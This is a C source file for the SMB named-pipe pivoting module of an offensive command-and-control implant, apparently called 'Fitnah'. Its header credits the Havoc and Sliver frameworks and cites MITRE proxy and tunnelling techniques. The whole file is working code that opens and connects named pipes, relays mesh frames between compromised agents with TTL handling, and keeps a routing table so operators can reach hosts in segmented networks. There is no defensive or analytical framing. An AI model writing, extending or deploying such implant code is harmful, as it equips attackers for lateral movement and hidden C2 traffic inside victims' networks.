/*
 * smb_pivot.c — SMB named pipe P2P pivot — multi-hop mesh
 *
 * Adapted from HavocFramework/Havoc (MIT) + BishopFox/Sliver peer-to-peer
 * routing concepts (Apache 2.0).
 *
 * Mesh frame layout (all fields little-endian except MAGIC):
 *   Offset  Size  Field
 *   0       4     MAGIC (0x46495448 "FITH")
 *   4       4     dst_agent_id
 *   8       4     src_agent_id
 *   12      1     ttl (decremented at each relay; dropped when 0)
 *   13      4     payload_len
 *   17      N     payload bytes
 *
 * MITRE: T1090.001, T1572
 */

#include "smb_pivot.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* ── Global state ─────────────────────────────────────────────────────────── */
PPIVOT_NODE      g_pivots      = NULL;
CRITICAL_SECTION g_pivot_lock;
ROUTE_ENTRY      g_routes[MAX_ROUTES];
int              g_route_count = 0;
uint32_t         g_my_agent_id = 0;

static uint32_t  s_next_id     = 0x1000;

/* ── Helpers ─────────────────────────────────────────────────────────────── */

static uint32_t _alloc_id(void) {
    return InterlockedIncrement((LONG *)&s_next_id);
}

static PPIVOT_NODE _find_node(uint32_t agent_id) {
    PPIVOT_NODE n = g_pivots;
    while (n) {
        if (n->agent_id == agent_id) return n;
        n = n->next;
    }
    return NULL;
}

static void _append_node(PPIVOT_NODE node) {
    node->next = NULL;
    if (!g_pivots) { g_pivots = node; return; }
    PPIVOT_NODE tail = g_pivots;
    while (tail->next) tail = tail->next;
    tail->next = node;
}

static BOOL _pipe_read_exact(HANDLE h, void *buf, DWORD want) {
    BYTE *p = (BYTE *)buf;
    DWORD got = 0, total = 0;
    while (total < want) {
        if (!ReadFile(h, p + total, want - total, &got, NULL) || got == 0)
            return FALSE;
        total += got;
    }
    return TRUE;
}

static BOOL _pipe_write_exact(HANDLE h, const void *buf, DWORD len) {
    const BYTE *p = (const BYTE *)buf;
    DWORD sent = 0, total = 0;
    while (total < len) {
        if (!WriteFile(h, p + total, len - total, &sent, NULL) || sent == 0)
            return FALSE;
        total += sent;
    }
    return TRUE;
}

/* Build a mesh frame into out_frame (caller allocates MESH_HEADER_SIZE + payload_len) */
static void _build_frame(uint8_t *out, uint32_t dst, uint32_t src,
                          uint8_t ttl, const void *payload, uint32_t plen)
{
    uint32_t magic = MESH_MAGIC;
    memcpy(out,      &magic,  4);
    memcpy(out + 4,  &dst,    4);
    memcpy(out + 8,  &src,    4);
    out[12] = ttl;
    memcpy(out + 13, &plen,   4);
    if (payload && plen)
        memcpy(out + 17, payload, plen);
}

/* Find the via_agent_id for routing dst; 0 = not found */
static uint32_t _find_route(uint32_t dst) {
    for (int i = 0; i < g_route_count; i++) {
        if (g_routes[i].dst_agent_id == dst)
            return g_routes[i].via_agent_id;
    }
    return 0;
}

/* ── Public API ──────────────────────────────────────────────────────────── */

void PivotInit(uint32_t my_agent_id) {
    InitializeCriticalSection(&g_pivot_lock);
    g_my_agent_id = my_agent_id;
    g_route_count = 0;
    memset(g_routes, 0, sizeof(g_routes));
}

uint32_t PivotListen(const wchar_t *pipe_suffix) {
    wchar_t pipe_name[256] = {0};
    _snwprintf_s(pipe_name, 256, _TRUNCATE, FITNAH_PIPE_PREFIX L"%s", pipe_suffix);

    HANDLE h = CreateNamedPipeW(
        pipe_name,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1, 65536, 65536, 5000, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;

    OVERLAPPED ov = {0};
    ov.hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(h, &ov);
    DWORD wait = WaitForSingleObject(ov.hEvent, 30000);
    CloseHandle(ov.hEvent);

    if (wait != WAIT_OBJECT_0) { CloseHandle(h); return 0; }

    PPIVOT_NODE node = (PPIVOT_NODE)calloc(1, sizeof(PIVOT_NODE));
    if (!node) { CloseHandle(h); return 0; }

    node->agent_id  = _alloc_id();
    node->handle    = h;
    node->is_server = TRUE;
    wcscpy_s(node->pipe_name, 256, pipe_name);

    EnterCriticalSection(&g_pivot_lock);
    _append_node(node);
    LeaveCriticalSection(&g_pivot_lock);

    return node->agent_id;
}

uint32_t PivotConnect(const wchar_t *full_pipe_name) {
    HANDLE h = INVALID_HANDLE_VALUE;
    for (int attempt = 0; attempt < 5; attempt++) {
        h = CreateFileW(full_pipe_name, GENERIC_READ | GENERIC_WRITE, 0,
                        NULL, OPEN_EXISTING, 0, NULL);
        if (h != INVALID_HANDLE_VALUE) break;
        if (GetLastError() == ERROR_PIPE_BUSY)
            WaitNamedPipeW(full_pipe_name, 5000);
        else
            Sleep(1000);
    }
    if (h == INVALID_HANDLE_VALUE) return 0;

    PPIVOT_NODE node = (PPIVOT_NODE)calloc(1, sizeof(PIVOT_NODE));
    if (!node) { CloseHandle(h); return 0; }

    node->agent_id  = _alloc_id();
    node->handle    = h;
    node->is_server = FALSE;
    wcscpy_s(node->pipe_name, 256, full_pipe_name);

    EnterCriticalSection(&g_pivot_lock);
    _append_node(node);
    LeaveCriticalSection(&g_pivot_lock);

    return node->agent_id;
}

BOOL PivotSendRaw(uint32_t via_agent_id, const void *frame, uint32_t frame_len) {
    if (!frame || frame_len == 0) return FALSE;

    EnterCriticalSection(&g_pivot_lock);
    PPIVOT_NODE node = _find_node(via_agent_id);
    LeaveCriticalSection(&g_pivot_lock);
    if (!node || node->handle == INVALID_HANDLE_VALUE) return FALSE;

    return _pipe_write_exact(node->handle, frame, frame_len);
}

BOOL PivotSend(uint32_t dst_agent_id, const void *payload, uint32_t payload_len) {
    if (!payload || payload_len == 0 || payload_len > MAX_PIVOT_PACKET)
        return FALSE;

    uint32_t frame_len = MESH_HEADER_SIZE + payload_len;
    uint8_t *frame     = (uint8_t *)malloc(frame_len);
    if (!frame) return FALSE;

    _build_frame(frame, dst_agent_id, g_my_agent_id,
                 MESH_TTL_DEFAULT, payload, payload_len);

    BOOL ok = FALSE;

    if (dst_agent_id == 0 || dst_agent_id == g_my_agent_id) {
        /* Local delivery — shouldn't normally be called this way, but handle it */
        free(frame);
        return FALSE;
    }

    /* Direct pivot? */
    EnterCriticalSection(&g_pivot_lock);
    PPIVOT_NODE direct = _find_node(dst_agent_id);
    LeaveCriticalSection(&g_pivot_lock);

    if (direct) {
        ok = _pipe_write_exact(direct->handle, frame, frame_len);
    } else {
        /* Route via routing table */
        uint32_t via = _find_route(dst_agent_id);
        if (via) ok = PivotSendRaw(via, frame, frame_len);
    }

    free(frame);
    return ok;
}

BOOL PivotAddRoute(uint32_t dst_agent_id, uint32_t via_agent_id) {
    EnterCriticalSection(&g_pivot_lock);
    /* Update if exists */
    for (int i = 0; i < g_route_count; i++) {
        if (g_routes[i].dst_agent_id == dst_agent_id) {
            g_routes[i].via_agent_id = via_agent_id;
            LeaveCriticalSection(&g_pivot_lock);
            return TRUE;
        }
    }
    if (g_route_count >= MAX_ROUTES) {
        LeaveCriticalSection(&g_pivot_lock);
        return FALSE;
    }
    g_routes[g_route_count].dst_agent_id = dst_agent_id;
    g_routes[g_route_count].via_agent_id = via_agent_id;
    g_route_count++;
    LeaveCriticalSection(&g_pivot_lock);
    return TRUE;
}

BOOL PivotDelRoute(uint32_t dst_agent_id) {
    EnterCriticalSection(&g_pivot_lock);
    for (int i = 0; i < g_route_count; i++) {
        if (g_routes[i].dst_agent_id == dst_agent_id) {
            g_routes[i] = g_routes[--g_route_count];
            LeaveCriticalSection(&g_pivot_lock);
            return TRUE;
        }
    }
    LeaveCriticalSection(&g_pivot_lock);
    return FALSE;
}

/*
 * PivotPoll — read all pending mesh frames from every active pipe.
 * Frames for this node → extracted, payload appended to output buffer.
 * Frames for other nodes → TTL decremented and forwarded (relayed).
 */
void *PivotPoll(uint32_t *total_bytes) {
    *total_bytes = 0;

    uint32_t  cap  = 4 * 1024 * 1024;
    uint8_t  *out  = (uint8_t *)malloc(cap);
    if (!out) return NULL;
    uint32_t  used = 0;

    EnterCriticalSection(&g_pivot_lock);
    PPIVOT_NODE node = g_pivots;

    while (node) {
        PPIVOT_NODE next = node->next;
        if (node->handle == INVALID_HANDLE_VALUE) { node = next; continue; }

        int loops = 0;
        while (loops++ < MAX_SMB_PACKETS_PER_LOOP) {
            DWORD avail = 0;
            if (!PeekNamedPipe(node->handle, NULL, 0, NULL, &avail, NULL)) {
                if (GetLastError() == ERROR_BROKEN_PIPE ||
                    GetLastError() == ERROR_NO_DATA) {
                    CloseHandle(node->handle);
                    node->handle = INVALID_HANDLE_VALUE;
                }
                break;
            }
            if (avail < MESH_HEADER_SIZE) break;

            /* Read mesh header */
            uint8_t hdr[MESH_HEADER_SIZE];
            if (!_pipe_read_exact(node->handle, hdr, MESH_HEADER_SIZE)) break;

            uint32_t magic, dst, src, plen;
            uint8_t  ttl;
            memcpy(&magic, hdr,      4);
            memcpy(&dst,   hdr + 4,  4);
            memcpy(&src,   hdr + 8,  4);
            ttl = hdr[12];
            memcpy(&plen,  hdr + 13, 4);

            if (magic != MESH_MAGIC || plen == 0 || plen > MAX_PIVOT_PACKET)
                break;

            uint8_t *payload = (uint8_t *)malloc(plen);
            if (!payload) break;
            if (!_pipe_read_exact(node->handle, payload, plen)) { free(payload); break; }

            if (dst == g_my_agent_id || dst == 0) {
                /* Destined for us — output as [uint32 len][payload] */
                while (used + 4 + plen > cap) {
                    cap *= 2;
                    out  = (uint8_t *)realloc(out, cap);
                    if (!out) { free(payload); LeaveCriticalSection(&g_pivot_lock); return NULL; }
                }
                memcpy(out + used, &plen, 4);
                used += 4;
                memcpy(out + used, payload, plen);
                used += plen;
            } else if (ttl > 0) {
                /* Relay: decrement TTL and forward */
                ttl--;
                uint32_t flen = MESH_HEADER_SIZE + plen;
                uint8_t *frame = (uint8_t *)malloc(flen);
                if (frame) {
                    _build_frame(frame, dst, src, ttl, payload, plen);

                    /* Direct pivot? */
                    PPIVOT_NODE direct = _find_node(dst);
                    if (direct && direct->handle != INVALID_HANDLE_VALUE) {
                        _pipe_write_exact(direct->handle, frame, flen);
                    } else {
                        /* Route table lookup (must not block under lock) */
                        uint32_t via = _find_route(dst);
                        if (via) {
                            PPIVOT_NODE relay = _find_node(via);
                            if (relay && relay->handle != INVALID_HANDLE_VALUE)
                                _pipe_write_exact(relay->handle, frame, flen);
                        }
                    }
                    free(frame);
                }
            }
            /* TTL == 0: silently drop */
            free(payload);
        }
        node = next;
    }

    LeaveCriticalSection(&g_pivot_lock);

    if (used == 0) { free(out); return NULL; }
    *total_bytes = used;
    return out;
}

BOOL PivotRemove(uint32_t agent_id) {
    EnterCriticalSection(&g_pivot_lock);

    PPIVOT_NODE prev = NULL, cur = g_pivots;
    while (cur) {
        if (cur->agent_id == agent_id) {
            if (prev)    prev->next  = cur->next;
            else         g_pivots    = cur->next;

            if (cur->handle && cur->handle != INVALID_HANDLE_VALUE) {
                if (cur->is_server) DisconnectNamedPipe(cur->handle);
                CloseHandle(cur->handle);
            }
            SecureZeroMemory(cur, sizeof(PIVOT_NODE));
            free(cur);
            LeaveCriticalSection(&g_pivot_lock);
            return TRUE;
        }
        prev = cur;
        cur  = cur->next;
    }

    LeaveCriticalSection(&g_pivot_lock);
    return FALSE;
}

uint32_t PivotCount(void) {
    EnterCriticalSection(&g_pivot_lock);
    uint32_t n = 0;
    PPIVOT_NODE p = g_pivots;
    while (p) { n++; p = p->next; }
    LeaveCriticalSection(&g_pivot_lock);
    return n;
}

char *PivotListJson(void) {
    char *buf = (char *)malloc(8192);
    if (!buf) return NULL;
    int  off  = snprintf(buf, 8192, "[");

    EnterCriticalSection(&g_pivot_lock);
    PPIVOT_NODE p    = g_pivots;
    BOOL        first = TRUE;
    while (p) {
        char name[256] = {0};
        WideCharToMultiByte(CP_UTF8, 0, p->pipe_name, -1, name, 255, NULL, NULL);
        off += snprintf(buf + off, 8192 - off,
                        "%s{\"agent_id\":%u,\"pipe\":\"%s\",\"mode\":\"%s\"}",
                        first ? "" : ",",
                        p->agent_id, name,
                        p->is_server ? "server" : "client");
        first = FALSE;
        p = p->next;
    }
    LeaveCriticalSection(&g_pivot_lock);
    snprintf(buf + off, 8192 - off, "]");
    return buf;
}

char *PivotRoutesJson(void) {
    char *buf = (char *)malloc(4096);
    if (!buf) return NULL;
    int off = snprintf(buf, 4096, "[");

    EnterCriticalSection(&g_pivot_lock);
    for (int i = 0; i < g_route_count; i++) {
        off += snprintf(buf + off, 4096 - off,
                        "%s{\"dst\":%u,\"via\":%u}",
                        i == 0 ? "" : ",",
                        g_routes[i].dst_agent_id,
                        g_routes[i].via_agent_id);
    }
    LeaveCriticalSection(&g_pivot_lock);
    snprintf(buf + off, 4096 - off, "]");
    return buf;
}
